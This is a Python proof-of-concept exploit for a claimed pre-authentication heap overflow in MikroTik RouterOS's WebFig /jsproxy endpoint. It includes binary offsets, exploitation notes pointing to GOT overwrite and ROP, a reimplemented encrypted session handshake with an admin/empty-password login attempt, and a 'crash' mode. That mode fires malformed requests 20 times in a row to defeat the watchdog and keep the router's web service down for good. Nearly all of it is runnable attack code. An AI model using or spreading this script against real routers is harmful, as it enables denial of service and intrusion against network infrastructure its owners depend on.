#!/usr/bin/env python3
"""
CVE-2026-84411 — MikroTik RouterOS WebFig Pre-Auth Heap Overflow PoC

Target:  RouterOS < 7.24 (stable), < 7.23.8 (LT), < 6.49.23
Surface: /jsproxy endpoint, unauthenticated
Bug:     Integer underflow in HTTP body receive: capacity - received wraps
         when received > capacity, causing read() with ~0xFFFFFFFF length.

Binary details (RouterOS 7.22.1):
  ARM (nova/bin/www):
    Vulnerable sub:  0x1f9a4  sub r2, r2, r1   ; capacity - received
    read() call:     0x1f9ac  bl read
    Fix in 7.25.1:   0x1f728  cmp r0, r3 / bls ; guard added

  x86 (CHR www):
    Vulnerable sub:  0x8057626  sub eax, edx    ; capacity - received
    read() call:     0x8057631  call read@plt
    write_pos calc:  0x8057629  lea eax,[ecx+edx+4]

Protections: NX=on, PIE=off, RELRO=partial (GOT writable), Canary=none
=> GOT overwrite + ROP is the exploitation path

CONFIRMED CRASH TRIGGER:
  POST /jsproxy with Content-Type: msg, Content-Length: 32, actual body >= 640B
  causes PERMANENT www process death (no auto-restart).

PROTOCOL NOTES:
  - Content-Type: msg MUST be present for jsproxy binary message processing
  - Header order: Content-Type MUST appear BEFORE Content-Length (else HTTP 500)
  - X25519 keys are BIG-ENDIAN on the wire (reversed from Python's LE format)
  - RC4 with 768-byte drop for session encryption
  - makeKey uses SHA1(master_BE + 40*\\x00 + magic + 40*\\xf2)[:16]

MODES:
  probe    — safe recon: check endpoint, attempt handshake
  trigger  — original 7-strategy crash attempts (legacy, less reliable)
  crash    — CONFIRMED crash trigger (Content-Type: msg + CL mismatch)
  session  — full encrypted jsproxy session establishment + overflow testing
  all      — probe + crash

USAGE:
  python3 cve_2026_84411_poc.py 127.0.0.1 18080 --mode probe
  python3 cve_2026_84411_poc.py 127.0.0.1 18080 --mode crash
  python3 cve_2026_84411_poc.py 127.0.0.1 18080 --mode session
  python3 cve_2026_84411_poc.py 127.0.0.1 18080 --mode all

WARNING: --mode crash / trigger WILL crash the www process on vulnerable builds.
         Use only in lab (CHR) or with explicit authorization.

Author:  Stephan Botes — Engagement SOW-2026-001
"""

import argparse
import hashlib
import socket
import struct
import sys
import time
import traceback

try:
    from cryptography.hazmat.primitives.asymmetric.x25519 import (
        X25519PrivateKey, X25519PublicKey,
    )
    from cryptography.hazmat.decrepit.ciphers.algorithms import ARC4
    from cryptography.hazmat.primitives.ciphers import Cipher
    HAS_CRYPTO = True
except ImportError:
    HAS_CRYPTO = False


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------
def log(level, msg):
    colors = {'*': '\033[94m', '+': '\033[92m', '!': '\033[91m', '-': '\033[93m'}
    reset = '\033[0m'
    c = colors.get(level, '')
    print(f"{c}[{level}]{reset} {msg}")


def make_socket(target, port, timeout=10):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    s.connect((target, port))
    return s


def send_http(sock, method, path, body=b'', extra_headers=None, cl_override=None):
    cl = cl_override if cl_override is not None else len(body)
    lines = [
        f"{method} {path} HTTP/1.1",
        "Host: target",
        f"Content-Length: {cl}",
    ]
    if extra_headers:
        for k, v in extra_headers.items():
            lines.append(f"{k}: {v}")
    lines.append("")
    lines.append("")
    sock.sendall("\r\n".join(lines).encode() + body)


def send_jsproxy_raw(sock, target, port, body, cl_override=None):
    """Send POST /jsproxy with correct header order (Content-Type: msg BEFORE CL)."""
    cl = cl_override if cl_override is not None else len(body)
    req = (
        f"POST /jsproxy HTTP/1.1\r\n"
        f"Host: {target}:{port}\r\n"
        f"Content-Type: msg\r\n"
        f"Content-Length: {cl}\r\n"
        f"Connection: keep-alive\r\n"
        f"\r\n"
    ).encode() + body
    sock.sendall(req)


def recv_http(sock, timeout=5):
    sock.settimeout(timeout)
    data = b''
    try:
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
            if b'\r\n\r\n' in data:
                hdr_end = data.index(b'\r\n\r\n') + 4
                cl = 0
                for line in data[:hdr_end].decode('latin-1', errors='replace').split('\r\n'):
                    if line.lower().startswith('content-length:'):
                        cl = int(line.split(':', 1)[1].strip())
                if len(data) - hdr_end >= cl:
                    break
    except socket.timeout:
        pass
    return data


def recv_jsproxy(sock, timeout=10):
    """Receive an HTTP response and return (status_line, body)."""
    sock.settimeout(timeout)
    data = b""
    while True:
        chunk = sock.recv(4096)
        if not chunk:
            raise ConnectionError("Server closed connection")
        data += chunk
        if b"\r\n\r\n" in data:
            hdr_end = data.index(b"\r\n\r\n") + 4
            hdr = data[:hdr_end].decode(errors='replace')
            cl = 0
            for line in hdr.split("\r\n"):
                if line.lower().startswith("content-length:"):
                    cl = int(line.split(":")[1].strip())
            resp_body = data[hdr_end:]
            while len(resp_body) < cl:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                resp_body += chunk
            status = hdr.split("\r\n")[0]
            return status, resp_body[:cl]


def get_status(resp):
    if not resp or b' ' not in resp:
        return None
    parts = resp.split(b' ', 2)
    if len(parts) >= 2:
        try:
            return int(parts[1])
        except ValueError:
            pass
    return None


def check_alive(target, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((target, port))
        s.sendall(b"GET / HTTP/1.0\r\nHost: t\r\n\r\n")
        r = s.recv(4096)
        s.close()
        return b"200" in r or b"302" in r
    except Exception:
        return False


# ---------------------------------------------------------------------------
# jsproxy protocol helpers (reversed from WebFig JS)
# ---------------------------------------------------------------------------
class RC4Drop768:
    """RC4 cipher with 768-byte key-schedule drop (MikroTik variant)."""
    def __init__(self, key: bytes):
        if not HAS_CRYPTO:
            raise RuntimeError("cryptography library required")
        cipher = Cipher(ARC4(key), mode=None)
        self._enc = cipher.encryptor()
        self._enc.update(bytes(768))

    def crypt(self, data: bytes) -> bytes:
        return self._enc.update(data)


def sha1(data: bytes) -> bytes:
    return hashlib.sha1(data).digest()


def make_key(master_key_be: bytes, is_send: bool, is_server: bool) -> bytes:
    """Derive RC4 session key from big-endian master key (MikroTik makeKey)."""
    magic2 = b"On the client side, this is the send key; on the server side, it is the receive key."
    magic3 = b"On the client side, this is the receive key; on the server side, it is the send key."

    v = bytearray(master_key_be)
    v += b'\x00' * 40
    if is_send == is_server:
        v += magic3
    else:
        v += magic2
    v += b'\xf2' * 40

    return sha1(bytes(v))[:16]


def jsproxy_handshake(sock, target, port, privkey):
    """Perform jsproxy X25519 handshake. Returns (session_id, tx_enc, rx_enc) or raises."""
    pubkey_le = privkey.public_key().public_bytes_raw()
    pubkey_be = pubkey_le[::-1]  # MikroTik uses BE on the wire

    handshake_body = struct.pack('>II', 0, 0) + pubkey_be
    send_jsproxy_raw(sock, target, port, handshake_body)
    status, resp = recv_jsproxy(sock)

    if "200" not in status:
        raise RuntimeError(f"Handshake failed: {status}")
    if len(resp) < 40:
        raise RuntimeError(f"Response too short: {len(resp)}B")

    session_id = struct.unpack('>I', resp[:4])[0]
    server_pubkey_be = resp[8:40]
    server_pubkey_le = server_pubkey_be[::-1]  # Reverse for Python

    server_pub = X25519PublicKey.from_public_bytes(server_pubkey_le)
    master_key_le = privkey.exchange(server_pub)
    master_key_be = master_key_le[::-1]  # makeKey expects BE

    tx_key = make_key(master_key_be, is_send=True, is_server=False)
    rx_key = make_key(master_key_be, is_send=False, is_server=False)

    tx_enc = RC4Drop768(tx_key)
    rx_enc = RC4Drop768(rx_key)

    return session_id, tx_enc, rx_enc


def build_m2_login(username="admin", password=""):
    """Build an M2 login message: {s1: username, s3: password}."""
    # M2 magic
    msg = bytearray(b'\x4d\x32')
    # TLV: string field s1 (id=1, type=string short)
    # Type byte: 0x21 = string + short_id
    msg.append(0x21)
    msg.append(0x01)  # id = 1
    user_bytes = username.encode()
    msg.append(len(user_bytes))
    msg.extend(user_bytes)
    # TLV: string field s3 (id=3, type=string short)
    msg.append(0x21)
    msg.append(0x03)  # id = 3
    pwd_bytes = password.encode()
    msg.append(len(pwd_bytes))
    msg.extend(pwd_bytes)
    # Wrap in length-prefixed frame
    frame = struct.pack('>I', len(msg)) + bytes(msg)
    return frame


def send_encrypted(sock, target, port, session_id, tx_enc, txseq, payload):
    """Encrypt and send a jsproxy message. Returns new txseq."""
    encrypted = tx_enc.crypt(payload)
    padding = tx_enc.crypt(b'\x20' * 8)
    frame = struct.pack('>II', session_id, txseq) + encrypted + padding
    new_seq = txseq + len(payload) + 8
    send_jsproxy_raw(sock, target, port, frame)
    return new_seq


# ---------------------------------------------------------------------------
# Mode: probe — verify the jsproxy endpoint is alive, no crash risk
# ---------------------------------------------------------------------------
def mode_probe(target, port):
    log('*', f"Probing {target}:{port} ...")

    # 1. GET /jsproxy
    log('*', "GET /jsproxy")
    try:
        s = make_socket(target, port)
        send_http(s, "GET", "/jsproxy")
        r = recv_http(s)
        status = get_status(r)
        log('+' if r else '!', f"  status={status}  len={len(r)}")
        s.close()
    except Exception as e:
        log('!', f"  failed: {e}")

    # 2. POST /jsproxy with Content-Type: msg (empty body)
    log('*', "POST /jsproxy with Content-Type: msg (empty)")
    try:
        s = make_socket(target, port)
        send_jsproxy_raw(s, target, port, b'')
        r = recv_http(s, timeout=3)
        status = get_status(r)
        log('+' if r else '-', f"  status={status}  len={len(r) if r else 0}")
        s.close()
    except Exception as e:
        log('!', f"  failed: {e}")

    # 3. POST /jsproxy with 40-byte handshake (Content-Type: msg + X25519)
    if HAS_CRYPTO:
        log('*', "POST /jsproxy (X25519 handshake, BE key format)")
        try:
            s = make_socket(target, port)
            privkey = X25519PrivateKey.generate()
            pubkey_be = privkey.public_key().public_bytes_raw()[::-1]
            handshake = struct.pack('>II', 0, 0) + pubkey_be
            send_jsproxy_raw(s, target, port, handshake)
            status, resp = recv_jsproxy(s)
            log('+', f"  {status}  body_len={len(resp)}")
            if len(resp) >= 40:
                sid = struct.unpack('>I', resp[:4])[0]
                server_pub = resp[8:40]
                log('+', f"  session_id={sid}")
                log('+', f"  server_pubkey={server_pub.hex()}")
                log('+', "  X25519 handshake SUCCESSFUL — jsproxy attack surface confirmed")
            s.close()
        except Exception as e:
            log('!', f"  failed: {e}")
    else:
        log('-', "Skipping X25519 handshake (pip install cryptography)")

    # 4. Check if Content-Type: msg is required (without it = hang)
    log('*', "POST /jsproxy WITHOUT Content-Type: msg (expect hang/timeout)")
    try:
        s = make_socket(target, port, timeout=4)
        body = struct.pack('>II', 0, 0) + b'\x00' * 32
        send_http(s, "POST", "/jsproxy", body)
        r = recv_http(s, timeout=3)
        status = get_status(r)
        if r:
            log('-', f"  Got response without CT:msg — status={status} (unexpected)")
        else:
            log('+', "  No response (timeout) — confirms Content-Type: msg is REQUIRED")
        s.close()
    except socket.timeout:
        log('+', "  Timeout confirmed — Content-Type: msg is REQUIRED for jsproxy processing")
    except Exception as e:
        log('!', f"  {e}")

    log('+', "Probe complete")


# ---------------------------------------------------------------------------
# Mode: crash — CONFIRMED crash trigger
# ---------------------------------------------------------------------------
def mode_crash(target, port):
    log('!', f"CRASH MODE — confirmed trigger against {target}:{port}")
    log('!', "This WILL permanently kill the www process on vulnerable builds!")
    log('!', "No auto-restart — requires service/VM restart to recover.")
    print()

    # Verify service is alive first
    if not check_alive(target, port):
        log('!', "Service is already down!")
        return False

    log('+', "Service is alive, sending crash trigger...")
    log('*', "Trigger: POST /jsproxy, Content-Type: msg, CL=32, actual body=2048 bytes")

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect((target, port))

        body = b'\x41' * 2048
        req = (
            f"POST /jsproxy HTTP/1.1\r\n"
            f"Host: {target}:{port}\r\n"
            f"Content-Type: msg\r\n"
            f"Content-Length: 32\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        ).encode() + body
        s.sendall(req)

        # Try to read response
        s.settimeout(3)
        try:
            resp = s.recv(4096)
            if resp:
                log('*', f"Got response ({len(resp)}B): {resp[:80]}")
            else:
                log('*', "Connection closed by server (FIN)")
        except socket.timeout:
            log('*', "No response (timeout)")
        except ConnectionResetError:
            log('!', "Connection reset by server (RST)")
        s.close()
    except Exception as e:
        log('!', f"Send failed: {e}")

    # Rapid-fire: keep crashing the process as the watchdog restarts it
    log('*', "Rapid-fire crash loop (20 rounds, 0.3s apart) to overwhelm watchdog...")
    for volley in range(20):
        time.sleep(0.3)
        try:
            s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s2.settimeout(3)
            s2.connect((target, port))
            body2 = b'\x41' * 2048
            req2 = (
                f"POST /jsproxy HTTP/1.1\r\n"
                f"Host: {target}:{port}\r\n"
                f"Content-Type: msg\r\n"
                f"Content-Length: 32\r\n"
                f"Connection: close\r\n"
                f"\r\n"
            ).encode() + body2
            s2.sendall(req2)
            s2.settimeout(1)
            try:
                s2.recv(4096)
            except Exception:
                pass
            s2.close()
            log('*', f"  volley {volley + 1}/20: trigger sent")
        except (ConnectionRefusedError, OSError):
            log('*', f"  volley {volley + 1}/20: refused (www is down)")

    # Verify permanent crash
    log('*', "Checking if www is permanently dead...")
    time.sleep(2)
    alive_count = 0
    for attempt in range(10):
        alive = check_alive(target, port)
        if alive:
            alive_count += 1
        else:
            alive_count = 0
        status = "alive" if alive else "DOWN"
        log('!' if not alive else '-', f"  t={attempt * 2}s: www is {status}")
        if alive_count >= 3:
            log('-', "Service has stabilized — watchdog won this round")
            return False
        time.sleep(2)

    if alive_count == 0:
        log('+', "*** CONFIRMED: www process is PERMANENTLY DEAD (20s, no recovery) ***")
        log('+', "*** CVE-2026-84411 — pre-auth denial of service verified ***")
        log('+', "*** Integer underflow → heap overflow → process crash ***")
        log('*', "Service requires full device/VM restart (no auto-recovery)")
        return True
    else:
        log('-', "Service is intermittent — crash confirmed but watchdog partially recovers")
        return True


# ---------------------------------------------------------------------------
# Mode: session — full encrypted jsproxy session + overflow testing
# ---------------------------------------------------------------------------
def mode_session(target, port):
    if not HAS_CRYPTO:
        log('!', "cryptography library required: pip install cryptography")
        return

    log('*', f"Establishing encrypted jsproxy session with {target}:{port}")
    print()

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10)
    s.connect((target, port))

    privkey = X25519PrivateKey.generate()
    pubkey_le = privkey.public_key().public_bytes_raw()
    pubkey_be = pubkey_le[::-1]
    log('*', f"Our pubkey (BE): {pubkey_be.hex()}")

    # Step 1: Handshake
    log('*', "Step 1: X25519 handshake")
    try:
        session_id, tx_enc, rx_enc = jsproxy_handshake(s, target, port, privkey)
        log('+', f"  Session ID: {session_id}")
        log('+', "  Key exchange successful")
    except Exception as e:
        log('!', f"  Handshake failed: {e}")
        s.close()
        return

    # Step 2: Send encrypted M2 login message
    log('*', "Step 2: Sending encrypted M2 login (admin/empty)")
    txseq = 1
    login_msg = build_m2_login("admin", "")
    try:
        txseq = send_encrypted(s, target, port, session_id, tx_enc, txseq, login_msg)
        status, resp = recv_jsproxy(s)
        log('+', f"  {status}  response={len(resp)}B")

        if resp and len(resp) >= 16:
            resp_sid = struct.unpack('>I', resp[:4])[0]
            resp_seq = struct.unpack('>I', resp[4:8])[0]
            decrypted = rx_enc.crypt(resp[8:])
            pad = decrypted[-8:] if len(decrypted) >= 8 else b''
            log('+', f"  Response session_id={resp_sid} seq={resp_seq}")
            log('+', f"  Decrypted ({len(decrypted)}B): {decrypted[:64].hex()}")
            if pad == b'\x20' * 8:
                log('+', "  *** PADDING VALID — encrypted session FULLY WORKING ***")
                payload = decrypted[:-8]
                log('+', f"  Payload ({len(payload)}B): {payload.hex()}")
            else:
                log('-', f"  Padding: {pad.hex()} (expected 2020202020202020)")
    except Exception as e:
        log('!', f"  Login message failed: {e}")
        s.close()
        return

    # Step 3: Overflow testing via encrypted session
    log('*', "Step 3: Encrypted overflow size sweep")
    log('*', "  Testing increasing message sizes for crash/RST indicators...")
    for extra_size in [0, 100, 500, 1000, 4000, 8000, 16000, 32000, 64000]:
        try:
            msg = struct.pack('>I', 0) + b'\x41' * extra_size
            enc = tx_enc.crypt(msg)
            pad = tx_enc.crypt(b'\x20' * 8)
            frame = struct.pack('>II', session_id, txseq) + enc + pad
            txseq += len(msg) + 8

            send_jsproxy_raw(s, target, port, frame)
            status, resp = recv_jsproxy(s, timeout=5)
            resp_type = "binary" if resp and not resp.startswith(b'<') else "html-error"
            log('*', f"  msg={len(msg):6d}B frame={len(frame):6d}B: {status} resp={resp_type}({len(resp)}B)")
        except (ConnectionResetError, BrokenPipeError, ConnectionError) as e:
            log('!', f"  msg={len(msg):6d}B: CONNECTION DROP — {e}")
            log('!', "  Possible heap corruption triggered!")
            break
        except socket.timeout:
            log('-', f"  msg={len(msg):6d}B: timeout")
        except Exception as e:
            log('!', f"  msg={len(msg):6d}B: {e}")
            break

    try:
        s.close()
    except Exception:
        pass

    # Check if service survived
    time.sleep(1)
    alive = check_alive(target, port)
    if alive:
        log('+', "Service still alive after overflow sweep")
    else:
        log('!', "*** Service is DOWN after overflow sweep — heap corruption likely! ***")

    log('+', "Session test complete")


# ---------------------------------------------------------------------------
# Mode: trigger — original 7-strategy crash attempts (legacy)
# ---------------------------------------------------------------------------
def mode_trigger(target, port):
    log('!', f"TRIGGER MODE (legacy) — attempting crash on {target}:{port}")
    log('!', "NOTE: Use --mode crash for the confirmed trigger instead.")
    log('!', "These strategies predate the Content-Type: msg discovery.")
    print()

    crashed = False

    # Strategy 1: Content-Length mismatch WITH Content-Type: msg (fixed)
    log('*', "Strategy 1: CL mismatch with Content-Type: msg")
    for cl_declared in [32, 64, 128, 256, 512, 1024, 2048]:
        actual_size = cl_declared * 2 + 128
        body = b'\x41' * actual_size
        label = f"  CL={cl_declared} actual={actual_size}"
        try:
            s = make_socket(target, port, timeout=5)
            send_jsproxy_raw(s, target, port, body, cl_override=cl_declared)
            r = recv_http(s, timeout=3)
            status = get_status(r)
            log('*', f"{label} → status={status}")
            s.close()
        except (ConnectionRefusedError, ConnectionResetError, BrokenPipeError) as e:
            log('!', f"{label} → CONNECTION DROP: {e}")
            crashed = True
        except socket.timeout:
            log('-', f"{label} → timeout")
        time.sleep(0.3)

    if crashed:
        log('+', "*** www process likely crashed — trigger found! ***")
        time.sleep(2)
        try:
            s = make_socket(target, port, timeout=5)
            send_http(s, "GET", "/")
            r = recv_http(s, timeout=3)
            if r:
                log('*', "Service recovered (auto-restart). Crash was transient.")
            s.close()
        except Exception:
            log('+', "Service still down — confirmed crash!")
        return True

    # Strategy 2: Content-Length + Transfer-Encoding: chunked
    log('*', "Strategy 2: CL + chunked encoding confusion")
    try:
        s = make_socket(target, port, timeout=5)
        req = (
            "POST /jsproxy HTTP/1.1\r\n"
            "Host: target\r\n"
            "Content-Type: msg\r\n"
            "Content-Length: 64\r\n"
            "Transfer-Encoding: chunked\r\n"
            "\r\n"
        )
        chunk_data = b'\x42' * 4096
        chunked = f"{len(chunk_data):x}\r\n".encode() + chunk_data + b"\r\n0\r\n\r\n"
        s.sendall(req.encode() + chunked)
        r = recv_http(s, timeout=3)
        status = get_status(r)
        log('*' if r else '!', f"  status={status}  len={len(r) if r else 0}")
        s.close()
    except (ConnectionRefusedError, ConnectionResetError, BrokenPipeError) as e:
        log('!', f"  CONNECTION DROP: {e}")
        crashed = True
    except socket.timeout:
        log('-', "  timeout")

    # Strategy 3: Slow-drip past Content-Length boundary
    log('*', "Strategy 3: Slow-send past CL boundary")
    for buf_cap in [256, 1024, 2048, 4096]:
        overflow_by = 256
        total_target = buf_cap + overflow_by
        label = f"  buf={buf_cap} overflow_by={overflow_by}"
        try:
            s = make_socket(target, port, timeout=10)
            req = (
                f"POST /jsproxy HTTP/1.1\r\n"
                f"Host: target\r\n"
                f"Content-Type: msg\r\n"
                f"Content-Length: {buf_cap}\r\n"
                f"\r\n"
            )
            s.sendall(req.encode())
            sent = 0
            while sent < total_target:
                chunk = min(64, total_target - sent)
                try:
                    s.sendall(b'\x43' * chunk)
                    sent += chunk
                except (BrokenPipeError, ConnectionResetError) as e:
                    if sent > buf_cap:
                        log('!', f"{label} → DROP at byte {sent} (past CL!): {e}")
                        crashed = True
                    else:
                        log('*', f"{label} → drop at byte {sent} (within CL)")
                    break
            else:
                r = recv_http(s, timeout=2)
                status = get_status(r)
                log('*', f"{label} → sent all {total_target} bytes, status={status}")
            s.close()
        except (ConnectionRefusedError, ConnectionResetError) as e:
            log('!', f"{label} → CONNECTION DROP: {e}")
            crashed = True
        except socket.timeout:
            log('-', f"{label} → timeout")
        time.sleep(0.3)

    # Strategy 4: Pipelined POST requests
    log('*', "Strategy 4: HTTP pipelining (buffer reuse)")
    try:
        s = make_socket(target, port, timeout=5)
        r1_body = b'\x44' * 64
        r1 = (
            f"POST /jsproxy HTTP/1.1\r\nHost: target\r\n"
            f"Content-Type: msg\r\nContent-Length: {len(r1_body)}\r\n\r\n"
        )
        r2_body = b'\x45' * 8192
        r2 = (
            f"POST /jsproxy HTTP/1.1\r\nHost: target\r\n"
            f"Content-Type: msg\r\nContent-Length: {len(r2_body)}\r\n\r\n"
        )
        s.sendall(r1.encode() + r1_body + r2.encode() + r2_body)
        r = recv_http(s, timeout=3)
        status = get_status(r)
        log('*' if r else '!', f"  status={status}  len={len(r) if r else 0}")
        s.close()
    except (ConnectionRefusedError, ConnectionResetError, BrokenPipeError) as e:
        log('!', f"  CONNECTION DROP: {e}")
        crashed = True
    except socket.timeout:
        log('-', "  timeout")

    # Strategy 5: Unusual Content-Length values
    log('*', "Strategy 5: Unusual Content-Length values")
    for cl_val in ["-1", "0", "4294967295", "4294967296", "2147483647", "2147483648"]:
        try:
            s = make_socket(target, port, timeout=5)
            req = (
                f"POST /jsproxy HTTP/1.1\r\n"
                f"Host: target\r\n"
                f"Content-Type: msg\r\n"
                f"Content-Length: {cl_val}\r\n"
                f"\r\n"
            )
            s.sendall(req.encode() + b'\x46' * 256)
            r = recv_http(s, timeout=2)
            status = get_status(r)
            log('*', f"  CL={cl_val} → status={status}")
            s.close()
        except (ConnectionRefusedError, ConnectionResetError, BrokenPipeError) as e:
            log('!', f"  CL={cl_val} → CONNECTION DROP: {e}")
            crashed = True
        except socket.timeout:
            log('-', f"  CL={cl_val} → timeout")
        time.sleep(0.2)

    # Strategy 6: Persistent-connection post-CL overflow
    log('*', "Strategy 6: Persistent-connection post-CL overflow")
    for cl_size in [32, 64, 128, 256, 512, 1024]:
        overflow_bytes = cl_size + 512
        label = f"  CL={cl_size}, then sending {overflow_bytes} more bytes after"
        try:
            s = make_socket(target, port, timeout=10)
            body = b'\x00' * cl_size
            send_jsproxy_raw(s, target, port, body)
            time.sleep(0.3)
            overflow_data = b'\x41' * overflow_bytes
            try:
                s.sendall(overflow_data)
                log('*', f"{label} → sent overflow, waiting...")
                time.sleep(0.5)
                s.settimeout(2)
                try:
                    resp = s.recv(4096)
                    if resp:
                        log('*', f"{label} → got {len(resp)} bytes back")
                    else:
                        log('!', f"{label} → connection closed by server (possible crash)")
                        crashed = True
                except socket.timeout:
                    log('-', f"{label} → still open (server absorbing data)")
                except ConnectionResetError:
                    log('!', f"{label} → RST (possible crash!)")
                    crashed = True
            except (BrokenPipeError, ConnectionResetError) as e:
                log('!', f"{label} → BROKEN PIPE on overflow send: {e}")
                crashed = True
            s.close()
        except (ConnectionRefusedError, ConnectionResetError) as e:
            log('!', f"{label} → connection refused: {e} (service down?)")
            crashed = True
        except socket.timeout:
            log('-', f"{label} → timeout on connect")
        time.sleep(0.5)

    # Strategy 7: Large single-send past CL
    log('*', "Strategy 7: Single send with body much larger than CL")
    for cl_size in [16, 32, 64]:
        actual = 65536
        label = f"  CL={cl_size}, single send of {actual} bytes"
        try:
            s = make_socket(target, port, timeout=5)
            req = (
                f"POST /jsproxy HTTP/1.1\r\n"
                f"Host: target\r\n"
                f"Content-Type: msg\r\n"
                f"Content-Length: {cl_size}\r\n"
                f"\r\n"
            )
            payload = req.encode() + b'\x42' * actual
            s.sendall(payload)
            time.sleep(1)
            s.settimeout(2)
            try:
                resp = s.recv(4096)
                if resp:
                    status = get_status(resp)
                    log('*', f"{label} → status={status}")
                else:
                    log('!', f"{label} → empty recv (connection closed)")
                    crashed = True
            except socket.timeout:
                log('-', f"{label} → timeout (server still processing)")
            except ConnectionResetError:
                log('!', f"{label} → RST!")
                crashed = True
            s.close()
        except (ConnectionRefusedError, BrokenPipeError, ConnectionResetError) as e:
            log('!', f"{label} → {e}")
            crashed = True
        time.sleep(0.3)

    if crashed:
        log('+', "*** Crash indicators detected ***")
    else:
        log('-', "No crash observed with legacy strategies.")
        log('-', "Use --mode crash for the confirmed trigger.")

    return crashed


# ---------------------------------------------------------------------------
# Mode: all — probe then confirmed crash
# ---------------------------------------------------------------------------
def mode_all(target, port):
    mode_probe(target, port)
    print("\n" + "=" * 70 + "\n")
    mode_crash(target, port)


def main():
    banner = """
 ╔═══════════════════════════════════════════════════════════════╗
 ║  CVE-2026-84411 — RouterOS WebFig Pre-Auth Heap Overflow     ║
 ║  Integer underflow in HTTP body receive → read() overflow    ║
 ║  Affects: RouterOS < 7.24 / < 7.23.8 LT / < 6.49.23        ║
 ║                                                              ║
 ║  CONFIRMED: Content-Type: msg + CL mismatch → permanent DoS ║
 ╚═══════════════════════════════════════════════════════════════╝
"""
    print(banner)

    p = argparse.ArgumentParser(description='CVE-2026-84411 PoC')
    p.add_argument('target', help='Target IP')
    p.add_argument('port', type=int, nargs='?', default=80, help='Port (default 80)')
    p.add_argument('--mode', choices=['probe', 'trigger', 'crash', 'session', 'all'],
                   default='probe',
                   help='probe=safe recon, crash=confirmed DoS trigger, '
                        'session=encrypted jsproxy session, trigger=legacy, all=probe+crash')
    args = p.parse_args()

    log('*', f"Target: {args.target}:{args.port}")
    log('*', f"Mode: {args.mode}")
    print()

    modes = {
        'probe': mode_probe,
        'trigger': mode_trigger,
        'crash': mode_crash,
        'session': mode_session,
        'all': mode_all,
    }
    modes[args.mode](args.target, args.port)


if __name__ == '__main__':
    main()
